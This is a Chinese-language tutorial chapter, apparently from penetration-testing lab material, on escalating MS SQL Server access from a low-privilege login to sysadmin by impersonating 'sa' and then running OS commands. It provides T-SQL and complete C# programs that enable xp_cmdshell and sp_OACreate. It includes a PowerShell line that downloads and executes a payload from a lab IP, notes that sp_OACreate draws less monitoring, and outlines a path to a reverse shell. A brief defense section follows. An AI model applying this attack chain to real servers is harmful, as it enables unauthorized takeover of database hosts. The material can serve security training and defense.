# MS SQL 权限提升与代码执行

## 写在前面

本章详细讲解如何从低权限的 SQL 访问提升到 sysadmin 权限，并最终获得操作系统级别的代码执行。

---

## 一、SQL Server 权限模型回顾

### 1.1 登录 vs 用户

```
登录 (Login):
├── 服务器级别的身份
├── 用于连接 SQL Server
├── 可以是 Windows 账户或 SQL 账户
└── 示例: sa, corp1\offsec

用户 (User):
├── 数据库级别的身份
├── 登录映射到用户
├── 每个数据库有独立的用户
└── 示例: dbo, guest
```

### 1.2 角色层次

```
服务器角色:
├── sysadmin - 完全控制
├── serveradmin - 服务器配置
├── securityadmin - 登录管理
├── processadmin - 进程管理
├── setupadmin - 链接服务器
├── bulkadmin - BULK INSERT
├── diskadmin - 磁盘文件
├── dbcreator - 创建数据库
└── public - 默认角色

数据库角色:
├── db_owner - 数据库完全控制
├── db_securityadmin - 权限管理
├── db_accessadmin - 访问管理
├── db_datareader - 读取数据
├── db_datawriter - 写入数据
└── public - 默认角色
```

## 二、模拟 (Impersonation) 攻击

### 2.1 什么是模拟？

```
模拟允许:
├── 以其他登录/用户的身份执行查询
├── 需要显式的 IMPERSONATE 权限
├── 可以从低权限提升到高权限
└── 常见的配置错误导致漏洞
```

### 2.2 枚举可模拟的登录

```sql
-- 查询允许模拟的登录
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

### 2.3 登录级别模拟

```sql
-- 查看当前登录
SELECT SYSTEM_USER;
-- 输出: corp1\offsec

-- 模拟 sa 登录
EXECUTE AS LOGIN = 'sa';

-- 验证模拟成功
SELECT SYSTEM_USER;
-- 输出: sa

-- 恢复原始身份
REVERT;
```

### 2.4 用户级别模拟

```sql
-- 切换到 msdb 数据库
USE msdb;

-- 查看当前用户
SELECT USER_NAME();
-- 输出: guest

-- 模拟 dbo 用户
EXECUTE AS USER = 'dbo';

-- 验证模拟成功
SELECT USER_NAME();
-- 输出: dbo
```

### 2.5 TRUSTWORTHY 数据库

```sql
-- 检查 TRUSTWORTHY 属性
SELECT name, is_trustworthy_on
FROM sys.databases
WHERE is_trustworthy_on = 1;

-- msdb 默认启用 TRUSTWORTHY
-- dbo 用户在 msdb 中有 sysadmin 权限
```

## 三、C# 实现代码

### 3.1 枚举可模拟的登录

```csharp
using System;
using System.Data.SqlClient;

namespace SQLImpersonation
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer +
                             "; Database = " + database +
                             "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] 认证成功!");
            }
            catch
            {
                Console.WriteLine("[-] 认证失败");
                Environment.Exit(0);
            }

            // 枚举可模拟的登录
            String query = @"SELECT distinct b.name
                           FROM sys.server_permissions a
                           INNER JOIN sys.server_principals b
                           ON a.grantor_principal_id = b.principal_id
                           WHERE a.permission_name = 'IMPERSONATE';";

            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("[*] 可模拟的登录: " + reader[0]);
            }
            reader.Close();
            con.Close();
        }
    }
}
```

### 3.2 执行模拟

```csharp
// 模拟 sa 登录
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
SqlCommand command = new SqlCommand(impersonateUser, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

// 验证模拟成功
String checkUser = "SELECT SYSTEM_USER;";
command = new SqlCommand(checkUser, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("[+] 当前身份: " + reader[0]);
reader.Close();
```

## 四、xp_cmdshell 代码执行

### 4.1 启用 xp_cmdshell

```sql
-- 启用高级选项
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### 4.2 执行命令

```sql
-- 执行系统命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'dir C:\';

-- 下载并执行 payload
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.119.120/run.txt'')"';
```

### 4.3 C# 完整实现

```csharp
// 模拟 sa
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";

// 启用 xp_cmdshell
String enable_xpcmd = @"EXEC sp_configure 'show advanced options', 1;
                       RECONFIGURE;
                       EXEC sp_configure 'xp_cmdshell', 1;
                       RECONFIGURE;";

// 执行命令
String execCmd = "EXEC xp_cmdshell 'whoami';";

SqlCommand command = new SqlCommand(impersonateUser, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enable_xpcmd, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("[+] 命令结果: " + reader[0]);
reader.Close();
```

## 五、sp_OACreate 替代方法

### 5.1 为什么需要替代方法？

```
xp_cmdshell 的问题:
├── 被广泛监控
├── 可能被禁用或删除
├── 触发安全告警
└── 需要替代方案

sp_OACreate 优势:
├── 较少被监控
├── 使用 OLE 自动化
├── 可以执行任意命令
└── 更隐蔽
```

### 5.2 启用 OLE 自动化

```sql
-- 启用 OLE Automation Procedures
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

### 5.3 使用 sp_OACreate 执行命令

```sql
-- 声明变量
DECLARE @myshell INT;

-- 创建 WScript.Shell 对象
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;

-- 执行命令
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "whoami > C:\temp\output.txt"';
```

### 5.4 C# 实现

```csharp
// 模拟 sa
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";

// 启用 OLE Automation
String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";

// 执行命令
String execCmd = @"DECLARE @myshell INT;
                  EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
                  EXEC sp_oamethod @myshell, 'run', null,
                  'cmd /c ""echo Test > C:\Tools\file.txt""';";

SqlCommand command = new SqlCommand(impersonateUser, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enable_ole, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Close();

Console.WriteLine("[+] 命令已执行");
```

## 六、完整攻击流程

### 6.1 攻击步骤

```
步骤 1: 获得低权限 SQL 访问
┌─────────────────────────────────────────────────────────────┐
│  使用 Windows 集成认证连接                                   │
│  确认当前权限 (public 角色)                                  │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 2: 枚举模拟权限
┌─────────────────────────────────────────────────────────────┐
│  查询 sys.server_permissions                                │
│  发现 sa 允许模拟                                            │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 3: 执行模拟
┌─────────────────────────────────────────────────────────────┐
│  EXECUTE AS LOGIN = 'sa'                                    │
│  获得 sysadmin 权限                                          │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 4: 启用命令执行
┌─────────────────────────────────────────────────────────────┐
│  启用 xp_cmdshell 或 OLE Automation                         │
│  执行系统命令                                                │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 5: 获得 Shell
┌─────────────────────────────────────────────────────────────┐
│  下载并执行 reverse shell                                    │
│  获得 SQL 服务账户权限的 shell                               │
└─────────────────────────────────────────────────────────────┘
```

### 6.2 完整 C# 代码

```csharp
using System;
using System.Data.SqlClient;

namespace SQLEscalation
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer +
                             "; Database = " + database +
                             "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] 认证成功!");
            }
            catch
            {
                Console.WriteLine("[-] 认证失败");
                Environment.Exit(0);
            }

            // 1. 检查当前身份
            ExecuteQuery(con, "SELECT SYSTEM_USER;", "当前登录");

            // 2. 模拟 sa
            ExecuteNonQuery(con, "EXECUTE AS LOGIN = 'sa';");
            Console.WriteLine("[+] 已模拟 sa 登录");

            // 3. 验证模拟
            ExecuteQuery(con, "SELECT SYSTEM_USER;", "模拟后登录");

            // 4. 启用 xp_cmdshell
            String enable_xpcmd = @"EXEC sp_configure 'show advanced options', 1;
                                   RECONFIGURE;
                                   EXEC sp_configure 'xp_cmdshell', 1;
                                   RECONFIGURE;";
            ExecuteNonQuery(con, enable_xpcmd);
            Console.WriteLine("[+] xp_cmdshell 已启用");

            // 5. 执行命令
            ExecuteQuery(con, "EXEC xp_cmdshell 'whoami';", "命令结果");

            con.Close();
        }

        static void ExecuteQuery(SqlConnection con, String query, String label)
        {
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] " + label + ": " + reader[0]);
            reader.Close();
        }

        static void ExecuteNonQuery(SqlConnection con, String query)
        {
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }
    }
}
```

## 七、防御措施

### 7.1 权限配置

```sql
-- 移除不必要的 IMPERSONATE 权限
REVOKE IMPERSONATE ON LOGIN::sa FROM [user];

-- 禁用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- 禁用 OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;
```

### 7.2 监控检测

```
监控点:
├── EXECUTE AS 语句
├── sp_configure 调用
├── xp_cmdshell 执行
├── sp_OACreate 调用
├── 权限变更
└── 异常登录活动
```

## 九、总结

### 关键要点

✅ 模拟是常见的权限提升方法
✅ IMPERSONATE 权限配置错误导致漏洞
✅ xp_cmdshell 是最常用的命令执行方法
✅ sp_OACreate 是更隐蔽的替代方案
✅ 防御需要正确配置权限和监控

### 攻击链

```
低权限 SQL 访问
      ↓
枚举 IMPERSONATE 权限
      ↓
模拟 sa 或 dbo
      ↓
启用 xp_cmdshell / OLE
      ↓
执行系统命令
      ↓
获得 Shell
```
